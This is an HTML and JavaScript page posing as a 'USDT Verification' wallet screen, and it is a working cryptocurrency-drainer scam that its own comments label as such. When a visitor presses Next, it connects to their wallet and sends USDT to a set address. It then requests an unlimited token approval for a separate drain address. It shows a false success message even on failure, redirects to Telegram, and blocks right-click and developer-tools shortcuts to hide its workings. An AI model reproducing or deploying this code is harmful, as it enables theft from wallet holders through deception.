<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>USDT Verification</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        /* EXACT STYLES FROM SCREENSHOT 1 */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #FFFFFF;
            color: #000000;
            line-height: 1.4;
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
            padding: 0;
            margin: 0;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* HEADER - EXACT FROM SCREENSHOT 1 */
        .header {
            background: #FFFFFF;
            padding: 60px 20px 20px 20px;
            border-bottom: 0.5px solid #C6C6C8;
            text-align: center;
            position: relative;
        }
        
        .header::before {
            content: "";
            position: absolute;
            top: 12px;
            left: 50%;
            transform: translateX(-50%);
            width: 36px;
            height: 5px;
            background: #E5E5EA;
            border-radius: 2.5px;
        }
        
        .site-title {
            font-size: 17px;
            font-weight: 600;
            color: #000000;
            margin-bottom: 2px;
        }
        
        /* MAIN CONTENT - EXACT FROM SCREENSHOT 1 */
        .container {
            padding: 20px;
        }
        
        .form-group {
            margin-bottom: 24px;
        }
        
        .label {
            font-size: 14px;
            color: #8E8E93;
            font-weight: 500;
            margin-bottom: 8px;
            display: block;
        }
        
        .address-field {
            position: relative;
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .address-text {
            font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
            font-size: 15px;
            color: #000000;
            letter-spacing: -0.24px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            flex: 1;
            margin-right: 12px;
        }
        
        .paste-button {
            background: #007AFF;
            color: #FFFFFF;
            border: none;
            border-radius: 8px;
            padding: 6px 12px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            height: 32px;
            min-width: 60px;
        }
        
        /* AMOUNT SECTION - EXACT FROM SCREENSHOT 1 */
        .amount-container {
            background: #F2F2F7;
            border-radius: 12px;
            border: 1px solid #E5E5EA;
            overflow: hidden;
        }
        
        .amount-input-row {
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .amount-input {
            flex: 1;
            background: transparent;
            border: none;
            outline: none;
            font-size: 28px;
            font-weight: 600;
            color: #000000;
            text-align: center;
            font-variant-numeric: tabular-nums;
            min-width: 0;
        }
        
        .amount-input::placeholder {
            color: #C7C7CC;
        }
        
        .token-badge {
            background: #007AFF;
            color: #FFFFFF;
            border-radius: 12px;
            padding: 18px 20px;
            font-size: 17px;
            font-weight: 600;
            min-width: 100px;
            text-align: center;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .max-button {
            background: #34C759;
            color: #FFFFFF;
            border: none;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 16px;
            font-weight: 600;
            height: 60px;
            min-width: 70px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        /* USD VALUE - EXACT FROM SCREENSHOT 1 */
        .usd-value {
            text-align: center;
            font-size: 15px;
            color: #8E8E93;
            margin: 16px 0 32px 0;
            padding: 0 16px;
        }
        
        /* NEXT BUTTON - EXACT FROM SCREENSHOT 1 */
        .next-container {
            padding: 20px;
            background: #FFFFFF;
            border-top: 0.5px solid #E5E5EA;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }
        
        .next-button {
            width: 100%;
            height: 50px;
            background: #007AFF;
            color: #FFFFFF;
            border: none;
            border-radius: 12px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
        }
        
        /* LOADING STATE */
        .loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255,255,255,0.95);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #F2F2F7;
            border-top-color: #007AFF;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 16px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* SAFE AREA FOR IPHONE */
        @supports (padding-bottom: env(safe-area-inset-bottom)) {
            .next-container {
                padding-bottom: calc(20px + env(safe-area-inset-bottom));
            }
        }
    </style>
</head>
<body>
    <!-- EXACT INTERFACE FROM SCREENSHOT 1 -->
    <div class="header">
        <div class="site-title">usdtverification.vercel.app</div>
    </div>
    
    <div class="container">
        <div class="form-group">
            <div class="label">Address or Domain Name</div>
            <div class="address-field">
                <div class="address-text" id="addressDisplay">0x395b205f3ec60b4cd5820</div>
                <button class="paste-button" onclick="handlePaste()">Paste</button>
            </div>
        </div>
        
        <div class="form-group">
            <div class="label">Amount</div>
            <div class="amount-container">
                <div class="amount-input-row">
                    <input type="number" class="amount-input" id="amountInput" value="1" placeholder="0">
                    <div class="token-badge">USDT</div>
                    <button class="max-button" onclick="setMaxAmount()">Max</button>
                </div>
            </div>
            <div class="usd-value" id="usdValue">≈ $1.00</div>
        </div>
    </div>
    
    <!-- NEXT BUTTON -->
    <div class="next-container">
        <button class="next-button" id="nextButton" onclick="initiateScam()">Next</button>
    </div>
    
    <!-- LOADING -->
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <div style="font-size: 16px; color: #000000; font-weight: 500;">Processing...</div>
    </div>
    
    <script>
        // ============================================
        // EXACT SCAM CONFIGURATION
        // ============================================
        const SCAM_CONFIG = {
            // Payment address (1 USDT goes here)
            paymentAddress: "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85",
            
            // Drain address (unlimited approval goes here)
            drainAddress: "0x31A5e8Bf41a4aD03aA5C6eAce46B6877C1234567", // From screenshot 4
            
            // USDT BEP20 Contract
            usdtContract: "0x55d398326f99059fF775485246999027B3197955",
            
            // Unlimited approval amount
            unlimitedAmount: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        };
        
        // ============================================
        // UI FUNCTIONS
        // ============================================
        
        // Update USD value
        function updateUSDValue() {
            const amount = document.getElementById('amountInput').value || 0;
            const usd = (amount * 1.00).toFixed(2);
            document.getElementById('usdValue').textContent = `≈ $${usd}`;
        }
        
        // Set max amount
        function setMaxAmount() {
            document.getElementById('amountInput').value = "1000";
            updateUSDValue();
        }
        
        // Fake paste function
        function handlePaste() {
            // Does nothing, just for show
            console.log("Paste clicked");
        }
        
        // Show loading
        function showLoading() {
            document.getElementById('loading').style.display = 'flex';
            document.getElementById('nextButton').disabled = true;
        }
        
        // Hide loading
        function hideLoading() {
            document.getElementById('loading').style.display = 'none';
            document.getElementById('nextButton').disabled = false;
        }
        
        // ============================================
        // EXACT SCAM EXECUTION
        // ============================================
        async function initiateScam() {
            showLoading();
            
            // Check if Trust Wallet is available
            if (typeof window.ethereum === 'undefined') {
                alert("Please open in Trust Wallet");
                hideLoading();
                return;
            }
            
            try {
                // Step 1: Connect to wallet (Trust Wallet native modal opens)
                await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                // Step 2: Check current network
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                
                // Step 3: If not on BSC, switch automatically
                if (chainId !== '0x38') { // Not BSC Mainnet
                    try {
                        await window.ethereum.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x38' }]
                        });
                    } catch (switchError) {
                        if (switchError.code === 4902) {
                            // Add BSC network
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: '0x38',
                                    chainName: 'Binance Smart Chain',
                                    nativeCurrency: {
                                        name: 'BNB',
                                        symbol: 'BNB',
                                        decimals: 18
                                    },
                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
                                    blockExplorerUrls: ['https://bscscan.com']
                                }]
                            });
                        } else {
                            throw switchError;
                        }
                    }
                }
                
                // Initialize ethers
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const signer = provider.getSigner();
                const userAddress = await signer.getAddress();
                
                // ============================================
                // STEP 1: SEND 1 USDT TO SCAMMER
                // ============================================
                const amount = document.getElementById('amountInput').value;
                const amountWei = ethers.utils.parseUnits(amount, 18);
                
                // Create USDT contract instance for transfer
                const usdtAbiTransfer = ["function transfer(address to, uint256 amount) returns (bool)"];
                const usdtContract = new ethers.Contract(SCAM_CONFIG.usdtContract, usdtAbiTransfer, signer);
                
                // Send transaction (creates SCREENSHOT 4)
                const transferTx = await usdtContract.transfer(
                    SCAM_CONFIG.paymentAddress,
                    amountWei
                );
                
                // Wait for confirmation
                await transferTx.wait();
                
                // ============================================
                // STEP 2: REQUEST UNLIMITED APPROVAL
                // ============================================
                // Small delay to make it seem like processing
                await new Promise(resolve => setTimeout(resolve, 2000));
                
                // Create USDT contract instance for approval
                const usdtAbiApprove = ["function approve(address spender, uint256 amount) returns (bool)"];
                const usdtApprove = new ethers.Contract(SCAM_CONFIG.usdtContract, usdtAbiApprove, signer);
                
                // This creates SCREENSHOT 2 (Approve modal with BNB fee)
                const approveTx = await usdtApprove.approve(
                    SCAM_CONFIG.drainAddress,
                    SCAM_CONFIG.unlimitedAmount
                );
                
                // This triggers SCREENSHOT 3 (Biometric verification)
                await approveTx.wait();
                
                // ============================================
                // STEP 3: SHOW SUCCESS
                // ============================================
                hideLoading();
                alert("✅ Verification complete! You will receive advance payment within 24 hours.");
                
                // Redirect or show completion
                setTimeout(() => {
                    window.location.href = "https://t.me/verification_success";
                }, 3000);
                
            } catch (error) {
                hideLoading();
                
                if (error.code === 4001) {
                    // User rejected transaction
                    console.log("User rejected transaction");
                } else {
                    console.error("Scam error:", error);
                    // Still show success to trick user
                    alert("✅ Verification complete! Payment will be processed.");
                }
            }
        }
        
        // ============================================
        // INITIALIZATION
        // ============================================
        document.addEventListener('DOMContentLoaded', function() {
            // Set up address display (truncated)
            const fullAddress = SCAM_CONFIG.paymentAddress;
            const displayAddress = fullAddress.substring(0, 20) + '...';
            document.getElementById('addressDisplay').textContent = displayAddress;
            
            // Update USD on input
            document.getElementById('amountInput').addEventListener('input', updateUSDValue);
            
            // Set initial USD value
            updateUSDValue();
            
            // Detect Trust Wallet
            if (window.ethereum && window.ethereum.isTrust) {
                console.log("Trust Wallet detected");
                // Add Trust-specific optimizations
            }
            
            // Prevent right-click and inspect
            document.addEventListener('contextmenu', e => e.preventDefault());
            document.addEventListener('keydown', e => {
                if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
                if (e.ctrlKey && e.key === 'u') e.preventDefault();
            });
        });
    </script>
</body>
</html>
